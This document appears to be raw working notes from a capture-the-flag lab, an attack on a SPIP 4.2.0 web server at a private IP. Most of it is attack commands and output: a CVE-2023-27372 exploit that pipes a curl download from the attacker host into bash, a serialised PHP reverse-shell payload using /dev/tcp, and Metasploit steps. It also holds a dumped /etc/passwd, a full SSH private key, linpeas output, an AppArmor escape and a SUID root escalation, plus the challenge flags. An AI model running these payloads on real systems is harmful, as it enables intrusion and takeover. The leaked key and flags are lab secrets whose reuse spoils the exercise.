
10.10.175.50

admin
admin123



free web templates


http://10.10.175.50/spip/spip.php


http://10.10.175.50/spip/spip.php?page=plan&var_mode=calcul

http://10.10.175.50/spip/ecrire/

http://10.10.175.50/spip/ecrire/?exec=article_edit&new=oui

http://10.10.175.50/spip/ecrire/?exec=articles

http://10.10.175.50/spip/ecrire/?exec=article_edit&new=oui



php bash
https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php


[La mise à jour 4.2.9 de SPIP est disponible](https://www.spip.net/fr_update "4.2.9")  
**SPIP 4.2.0** is free software distributed [under the GPL license](https://www.gnu.org/licenses/gpl-3.0.html).  
+ safety screen 1.4.2

For more visit [https://www.spip.net/en](https://www.spip.net/en).


![[Pasted image 20241029154008.png]]

https://github.com/nuts7/CVE-2023-27372


./CVE-2023-27372.py -u http://10.10.175.50/ -c 'curl http://10.6.18.190:8000/xp.sh|bash' -v



http://10.10.175.50/spip/ecrire/?exec=article&id_article=2&ajouter=oui




http://10.10.175.50/spip/spip.php?page=spip_pass


&oubli=test%40gmail.com&oubli=s:19:"<?php phpinfo(); ?>";

&oubli=test%40gmail.com&oubli=s:19:"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.18.190/1234 0>&1'"); ?>";




<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.18.190/1234 0>&1'"); ?>







msfconsole

search spip

use 1

set LHOST tun0
set RHOST 10.10.175.50
set TARGETURI /spip
run


cat /home/think/user.txt
```
fa229046d44eda6a3598c73ad96f4ca5
```

/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
think:x:1000:1000::/home/think:/bin/sh


/home/think/.ssh/id_rsa


-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

chmod 600 think_id_rsa
ssh -i think_id_rsa think@10.10.175.50

https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/linpeas.sh
python -m http.server 8000
wget http://10.6.18.190:8000/linpeas.sh

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
systemd-j   352 35458 journal-o             root NOFD                                                  /proc/352/task/35458/fd (opendir: No such file or directory)



╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND     PID   TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
systemd-j   352 35458 journal-o             root NOFD                                                  /proc/352/task/35458/fd (opendir: No such file or directory)


╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"


	╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 3.0a


/tmp/tmux-1000


-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SGID binary)


╔══════════╣ Unexpected in root
/swap.img


╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Feb 11  2024 /var/backups


Hint:Look to the App Armor by it's profile.


```
think@publisher:/etc/apparmor.d$ ps -p $$
    PID TTY          TIME CMD
  52898 pts/1    00:00:00 ash


think@publisher:/dev/shm$ echo $SHELL
/usr/sbin/ash


think@publisher:/etc/apparmor.d$ cd /dev/shm/
think@publisher:/dev/shm$ cp /bin/bash .
think@publisher:/dev/shm$ ./bash 
think@publisher:/dev/shm$ ps -p $$
    PID TTY          TIME CMD
  53237 pts/1    00:00:00 bash


think@publisher:/dev/shm$ cd /opt/
think@publisher:/opt$ ls
containerd  dockerfile  run_container.sh


nano run_container
```

```
#!/bin/bash  
  
cp /bin/bash /tmp/default  
chmod +s /tmp/default
```

```
run_container
cd /tmp
./default -p
```

```
default-5.0# whoami
root
```

root.txt
```
3a4225cc9e85709adda6ef55d6a4f2ca
```